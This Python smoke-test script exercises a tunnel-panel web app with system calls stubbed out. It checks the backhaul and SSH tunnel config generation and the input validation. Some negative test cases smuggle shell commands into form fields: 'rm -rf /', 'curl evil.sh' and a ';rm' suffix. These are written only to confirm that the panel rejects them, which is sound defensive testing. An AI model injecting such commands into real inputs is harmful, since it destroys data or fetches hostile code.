"""Smoke-test the tunnel panel the way Ex-ui actually drives it.

Runs against the real app.py with systemctl stubbed out, so the request
handling, validation and config generation are exercised for real while
nothing touches the host.
"""
import os
import sys
import warnings

warnings.filterwarnings('ignore')
os.environ['PACKET_PROXY_SECRET'] = 'testsecret'
sys.argv = ['app.py']

import app  # noqa: E402

PROXY = {'X-Script-Name': '/panel/packet', 'X-Packet-Secret': 'testsecret'}
LOOPBACK = {'REMOTE_ADDR': '127.0.0.1'}

ran = []
app.run_cmd = lambda cmd, timeout=15: (ran.append(cmd), ('', '', 0))[1]

written = {}
real_open = open


def fake_open(path, mode='r', *a, **kw):
    p = str(path)
    if any(p.startswith(d) for d in ('/etc/', '/tmp/')) and ('w' in mode):
        class W:
            def write(self, data):
                written[p] = data

            def __enter__(self):
                return self

            def __exit__(self, *x):
                return False
        return W()
    return real_open(path, mode, *a, **kw)


app.open = fake_open
import builtins  # noqa: E402
builtins.open = fake_open
app.os.chmod = lambda *a, **k: None

c = app.app.test_client()
fails = []


def check(label, cond, detail=''):
    print(('  ok  ' if cond else '  FAIL') + '  ' + label + ('' if cond else '  <- ' + str(detail)))
    if not cond:
        fails.append(label)


print('\n-- pages render through the Ex-ui proxy --')
for path, needle in [('/panel/packet/add-backhaul', 'Backhaul'),
                     ('/panel/packet/add-ssh', 'PRIVATE KEY')]:
    r = c.get(path, headers=PROXY, environ_overrides=LOOPBACK)
    body = r.get_data(as_text=True)
    check(path, r.status_code == 200 and needle in body, r.status_code)
    check(path + ' links are prefixed',
          'action="/panel/packet/' in body and 'action="/add-' not in body)

print('\n-- backhaul server config --')
r = c.post('/panel/packet/add-backhaul', headers=PROXY, environ_overrides=LOOPBACK, data={
    'name': 'bh1', 'role': 'server', 'transport': 'ws', 'token': 'tok123',
    'port': '3080', 'ports': '8080=8080\n2053=2053\nnot a port\n'})
toml = written.get('/etc/backhaul/bh1.toml', '')
check('redirects to detail', r.status_code == 302, r.status_code)
check('[server] section', '[server]' in toml)
check('bind_addr uses port', 'bind_addr = ":3080"' in toml, toml)
check('transport honoured', 'transport = "ws"' in toml)
check('valid ports kept', '"8080=8080"' in toml and '"2053=2053"' in toml)
check('garbage port dropped', 'not a port' not in toml)
check('unit written', '/etc/systemd/system/backhaul-bh1.service' in written)
check('unit runs backhaul', '/usr/local/bin/backhaul -c /etc/backhaul/bh1.toml'
      in written.get('/etc/systemd/system/backhaul-bh1.service', ''))

print('\n-- backhaul client config --')
written.clear()
c.post('/panel/packet/add-backhaul', headers=PROXY, environ_overrides=LOOPBACK, data={
    'name': 'bh2', 'role': 'client', 'transport': 'tcp', 'token': 'tok123',
    'port': '3080', 'remote_addr': '1.2.3.4'})
toml = written.get('/etc/backhaul/bh2.toml', '')
check('[client] section', '[client]' in toml)
check('bare host gets the tunnel port', 'remote_addr = "1.2.3.4:3080"' in toml, toml)

print('\n-- backhaul rejects a bad remote --')
written.clear()
r = c.post('/panel/packet/add-backhaul', headers=PROXY, environ_overrides=LOOPBACK, data={
    'name': 'bh3', 'role': 'client', 'remote_addr': 'evil host; rm -rf /'})
check('no config written', '/etc/backhaul/bh3.toml' not in written)
check('form re-rendered with the error', r.status_code == 200
      and 'not a valid host' in r.get_data(as_text=True))

print('\n-- ssh tunnel --')
written.clear()
KEY = '-----BEGIN OPENSSH PRIVATE KEY-----\r\nabc\r\n-----END OPENSSH PRIVATE KEY-----'
r = c.post('/panel/packet/add-ssh', headers=PROXY, environ_overrides=LOOPBACK, data={
    'name': 'ssh1', 'direction': 'reverse', 'ssh_host': '1.2.3.4', 'ssh_user': 'root',
    'ssh_port': '2200', 'listen_addr': '0.0.0.0', 'listen_port': '8443',
    'dest_host': '127.0.0.1', 'dest_port': '443', 'private_key': KEY})
unit = written.get('/etc/systemd/system/sshtun-ssh1.service', '')
check('redirects to detail', r.status_code == 302, r.status_code)
check('reverse uses -R', '-R 0.0.0.0:8443:127.0.0.1:443' in unit, unit)
check('ssh port honoured', '-p 2200' in unit)
check('user@host', 'root@1.2.3.4' in unit)
check('key path referenced', '/etc/paqet-panel/ssh/ssh1.key' in unit)
check('CRLF stripped from key', '\r' not in written.get('/etc/paqet-panel/ssh/ssh1.key', ''))

print('\n-- ssh rejects injection in the host field --')
written.clear()
r = c.post('/panel/packet/add-ssh', headers=PROXY, environ_overrides=LOOPBACK, data={
    'name': 'ssh2', 'ssh_host': '1.2.3.4 && curl evil.sh', 'private_key': KEY})
check('no unit written', '/etc/systemd/system/sshtun-ssh2.service' not in written)
check('error shown', r.status_code == 200
      and 'hostname or IP' in r.get_data(as_text=True))

print('\n-- ssh requires a key --')
written.clear()
r = c.post('/panel/packet/add-ssh', headers=PROXY, environ_overrides=LOOPBACK, data={
    'name': 'ssh3', 'ssh_host': '1.2.3.4', 'private_key': ''})
check('no unit written', '/etc/systemd/system/sshtun-ssh3.service' not in written)

print('\n-- service-name guard accepts all three kinds --')
for name, ok in [('paqet-a', True), ('backhaul-a', True), ('sshtun-a', True),
                 ('evil-a', False), ('paqet-a;rm', False)]:
    check('%-14s -> %s' % (name, ok), bool(app.SVC_NAME_RE.match(name)) == ok)

print('\n' + ('ALL PASS' if not fails else 'FAILURES: %s' % fails))
sys.exit(1 if fails else 0)
